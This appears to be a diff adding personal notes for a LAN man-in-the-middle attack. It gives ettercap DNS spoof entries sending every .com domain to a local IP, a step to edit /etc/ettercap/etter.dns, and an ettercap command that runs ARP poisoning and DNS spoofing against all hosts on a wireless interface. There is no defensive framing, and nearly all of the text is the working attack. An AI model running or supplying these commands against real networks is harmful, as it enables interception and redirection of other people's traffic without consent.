@@ -1,0 +1,23 @@
+
+
+
+
+# only cheng domin and ip 1 and 2 only 
+
+
+# microsoft sucks ;)
+# redirect it to www.linux.org
+#
+
+*.com      A   192.168.43.5
+*.*.com    A   192.168.43.5
+
+####################
+
+
+nano /etc/ettercap/etter.dns 
+
+
+ettercap -T -q -i wlan0 -P dns_spoof -M ARP ///
+
+
